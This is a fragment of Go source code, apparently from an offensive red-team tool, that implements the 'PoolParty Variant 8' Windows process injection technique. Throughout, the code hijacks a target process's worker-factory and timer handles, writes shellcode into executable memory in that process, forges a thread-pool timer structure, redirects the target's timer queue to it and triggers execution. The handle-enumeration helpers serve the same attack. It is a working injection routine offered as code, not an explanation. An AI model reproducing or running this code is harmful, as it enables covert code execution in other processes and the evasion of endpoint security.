	hTimer, err := hijackProcessHandle(hProcess, "IRTimer", windows.TIMER_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack timer handle: %v", err)
	}
	defer windows.CloseHandle(hTimer)
	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)

	// Step 4: Query worker factory to get TP_POOL address
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 5: Allocate and write shellcode to target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
		shellcodeAddr, // Timer callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpTimer == 0 {
		return output, fmt.Errorf("CreateThreadpoolTimer failed: %v", err)
	}
	output += "[+] Created TP_TIMER structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_TIMER in target process first (we need the address for linkage)
	var tpTimer FULL_TP_TIMER

	tpTimerAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpTimer)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpTimerAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)

	// Step 8: Cast the pointer to access the structure directly like SafeBreach does
	// SafeBreach directly modifies the structure returned by CreateThreadpoolTimer
	pTimer := (*FULL_TP_TIMER)(unsafe.Pointer(pTpTimer))

	// Step 9: Modify TP_TIMER structure for insertion
	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)

	// Set Pool pointer to target's TP_POOL
	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Note: CreateThreadpoolTimer should have set the Callback to shellcodeAddr already
	// SafeBreach doesn't manually set Callback - they pass it to CreateThreadpoolTimer

	// Set timer expiration
	pTimer.DueTime = timeout
	pTimer.WindowStartLinks.Key = timeout
	pTimer.WindowEndLinks.Key = timeout

	// Set up circular lists for WindowStart and WindowEnd Children only (NOT Siblings - SafeBreach doesn't set those)
	// Calculate remote addresses for the Window*Links.Children fields
	// Use dummy struct for offset calculation
	var dummyTimer FULL_TP_TIMER
	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks.Children))
	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks.Children))

	pTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
	pTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
	pTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr

	// Step 10: Write TP_TIMER to target process
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpTimerAddr,
		pTpTimer, // Write from the original pointer like SafeBreach does
		uintptr(unsafe.Sizeof(dummyTimer)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)

	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL

	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root

	targetTpPoolAddr := workerFactoryInfo.StartParameter

	// Calculate offsets step by step - Go doesn't handle nested offsetof well
	var dummyPool FULL_TP_POOL
	var dummyTimerQueue TPP_TIMER_QUEUE
	var dummySubQueue TPP_TIMER_SUBQUEUE

	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))

	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset

	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))

	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)

	// Write WindowStartLinks address to WindowStart.Root
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		windowStartRootAddr,
		uintptr(unsafe.Pointer(&remoteWindowStartLinksAddr)),
		uintptr(unsafe.Sizeof(remoteWindowStartLinksAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for WindowStart.Root failed: %v", err)
	}

	// Write WindowEndLinks address to WindowEnd.Root
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		windowEndRootAddr,
		uintptr(unsafe.Pointer(&remoteWindowEndLinksAddr)),
		uintptr(unsafe.Sizeof(remoteWindowEndLinksAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for WindowEnd.Root failed: %v", err)
	}
	output += "[+] Modified target process's TP_POOL timer queue to point to TP_TIMER\n"

	// Step 13: Set the timer to expire via NtSetTimer2
	var dueTime int64
	dueTime = timeout

	var params T2_SET_PARAMETERS
	status, _, _ = procNtSetTimer2.Call(
		uintptr(hTimer),
		uintptr(unsafe.Pointer(&dueTime)),
		0, // Period
		uintptr(unsafe.Pointer(&params)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
	}
	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
	output += "[+] PoolParty Variant 8 injection completed successfully\n"

	return output, nil
}

// hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
func hijackProcessHandle(hProcess windows.Handle, objectType string, desiredAccess uint32) (windows.Handle, error) {
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	const maxRetries = 5

	// Start with a reasonable initial buffer size and retry with increasing sizes
	var buffer []byte
	var returnLength uint32
	bufferSize := uint32(64 * 1024) // Start with 64KB

	var status uintptr
	for i := 0; i < maxRetries; i++ {
		buffer = make([]byte, bufferSize)
		status, _, _ = procNtQueryInformationProcess.Call(
			uintptr(hProcess),
			uintptr(ProcessHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if status == 0 {
			break // Success
		}

		if status == STATUS_INFO_LENGTH_MISMATCH {
			// Double the buffer size for next attempt, or use returnLength if provided
			if returnLength > bufferSize {
				bufferSize = returnLength + 4096
			} else {
				bufferSize *= 2
			}
			continue
		}

		// Some other error
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
	}

	// Parse handle information
	handleInfo := (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buffer[0]))
	handleEntrySize := unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})
	handleArrayOffset := unsafe.Sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION{})

	// Iterate through handles
	for i := uintptr(0); i < uintptr(handleInfo.NumberOfHandles); i++ {
		entryOffset := handleArrayOffset + (i * handleEntrySize)
		if entryOffset+handleEntrySize > uintptr(len(buffer)) {
			break
		}

		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&buffer[entryOffset]))

		// Try to duplicate the handle
		var duplicatedHandle windows.Handle
		err := windows.DuplicateHandle(
			hProcess,
			entry.HandleValue,
			windows.CurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			false,
			0,
		)
		if err != nil {
			continue
		}

		// Query the object type
		typeName, err := getObjectTypeName(duplicatedHandle)
		if err != nil {
			windows.CloseHandle(duplicatedHandle)
			continue
		}

		if typeName == objectType {
			return duplicatedHandle, nil
		}

		windows.CloseHandle(duplicatedHandle)
	}

	return 0, fmt.Errorf("failed to find handle of type: %s", objectType)
}

// getObjectTypeName queries the type name of an object handle
func getObjectTypeName(handle windows.Handle) (string, error) {
	// First call to get required buffer size
	var returnLength uint32
	procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if returnLength == 0 {
		returnLength = 256
	}

	buffer := make([]byte, returnLength)
	status, _, _ := procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return "", fmt.Errorf("NtQueryObject failed: 0x%X", status)
	}

	// Parse PUBLIC_OBJECT_TYPE_INFORMATION
	typeInfo := (*PUBLIC_OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	// Convert UNICODE_STRING to Go string
	if typeInfo.TypeName.Buffer == nil || typeInfo.TypeName.Length == 0 {
		return "", fmt.Errorf("empty type name")
	}

	typeName := windows.UTF16PtrToString(typeInfo.TypeName.Buffer)
	return typeName, nil
}
